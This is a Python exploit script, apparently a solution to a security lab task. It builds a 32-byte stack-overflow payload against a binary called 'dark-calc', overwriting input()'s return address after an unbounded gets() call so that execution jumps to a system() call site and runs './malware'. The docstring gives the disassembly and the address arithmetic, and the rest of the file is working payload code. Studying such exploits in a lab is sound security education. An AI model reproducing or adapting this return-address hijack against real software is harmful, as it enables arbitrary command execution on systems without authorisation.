#!/usr/bin/env python3
"""Task 1: hijack input()'s return address and run system("./malware").

Layout of input()'s frame (from `objdump -d attack/dark-calc`):

    401977 <input>:
      push %rbp
      mov  %rsp,%rbp
      sub  $0x10,%rsp          ; char expression[16] at rbp-0x10
      ...
      lea  -0x10(%rbp),%rax
      mov  %rax,%rdi
      call gets@plt            ; unbounded write => stack buffer overflow
      ...
      movl $0x6030d0,%edi      ; strcpy(command_buf, expression)
      call strcpy@plt
      leave                    ; rsp = rbp; pop rbp
      ret                      ; rip = *(rbp+8)  <-- overwritten

So the payload is

    [ 16 bytes  expression ][ 8 bytes saved rbp ][ 8 bytes return address ]

`expression` starts with the string "./malware" followed by a NUL byte, so the
`strcpy` that runs *after* `gets` copies exactly "./malware" into the global
`command_buf` (0x6030d0).  The return address is redirected to 0x401a6b, i.e.
the `movl $0x6030d0,%edi; callq system@plt` pair inside eval() - this skips the
`memmove`/`memcpy` that would have wrapped our string in `echo $(( ... ))` and
hands `command_buf` straight to system(3).
"""
import sys

COMMAND_BUF     = 0x6030D0           # global char command_buf[MAXLEN+16]
SYSTEM_CALLSITE = 0x401A6B           # eval: mov $command_buf,%edi; call system@plt

payload  = b"./malware\x00"          # the command that lands in command_buf
payload += b"A" * (16 - len(payload))  # pad the 16-byte local buffer
payload += b"B" * 8                  # saved rbp (don't care, we never return)
payload += SYSTEM_CALLSITE.to_bytes(8, "little")  # new return address

assert b"\n" not in payload and len(payload) == 32
sys.stdout.buffer.write(payload)
